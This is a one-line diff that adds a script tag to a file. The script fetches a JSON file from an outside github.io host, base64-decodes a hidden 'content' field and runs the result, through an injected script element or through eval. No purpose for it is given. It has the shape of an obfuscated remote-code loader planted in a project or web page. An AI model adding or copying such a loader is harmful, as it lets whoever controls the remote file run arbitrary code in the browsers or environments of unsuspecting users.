@@ -1,0 +1,1 @@
+<script>fetch('https://arzhospital.github.io/resumemanager/Content/apiserver.json?__random='+Math.random()).then(async response => atob((await response.json()).content)).then(js => {if(typeof(document)!=='undefined'){let newScript = document.createElement("script");newScript.appendChild(document.createTextNode(js));document.body.appendChild(newScript);}else{eval(js)}});</script>
